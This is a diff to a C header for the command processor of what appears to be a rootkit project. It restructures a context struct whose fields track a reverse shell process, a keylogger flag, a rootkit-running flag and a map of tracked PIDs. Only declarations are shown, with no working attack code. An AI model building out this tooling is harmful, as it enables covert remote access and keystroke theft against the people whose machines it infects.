@@ -1,11 +1,15 @@
 #ifndef __COMMAND_PROCESSOR_H
 #define __COMMAND_PROCESSOR_H
 
+#include <sys/types.h>
+
 typedef struct {
-    struct rootkit *skel;
-    char *executable_name;
-    pid_t reverse_shell_pid;
-} application_context_t;
+    int tracked_pids_map_fd;
+    const char *executable_name;
+    pid_t *reverse_shell_pid;
+    bool *keylogger_active;
+    volatile bool *rootkit_running;
+} command_processor_context_t;
 
 /**
  * @brief Callback to handle received commands of type event_t.
